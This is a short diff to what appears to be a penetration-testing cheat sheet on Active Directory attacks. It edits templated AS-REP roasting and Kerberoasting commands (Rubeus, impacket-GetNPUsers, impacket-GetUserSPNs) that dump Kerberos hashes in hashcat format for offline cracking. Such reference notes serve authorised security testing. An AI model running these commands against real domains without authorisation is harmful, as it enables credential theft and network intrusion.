@@ -27,14 +27,14 @@ impacket-GetADUsers -all -dc-ip <dc_ip> <domain>/<username>
 
 #Roasting
 .\Rubeus.exe asreproast /nowrap
-impacket-GetNPUsers.py <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile hashes-asrep
-impacket-GetNPUsers.py <domain_name>/<domain_user> -request -format hashcat -outputfile hashes-asrep -dc-ip <ip>
+impacket-GetNPUsers <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile hashes-asrep
+impacket-GetNPUsers <domain_name>/<domain_user> -request -format hashcat -outputfile hashes-asrep -dc-ip <ip>
 ```
 #### Kerberoasting
 ```
 #Roasting
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-impacket-GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile hashes-kerb
+impacket-GetUserSPNs <domain_name>/<domain_user> -outputfile hashes-kerb -dc-ip <ip>
 ```
 
 ### BloodHound
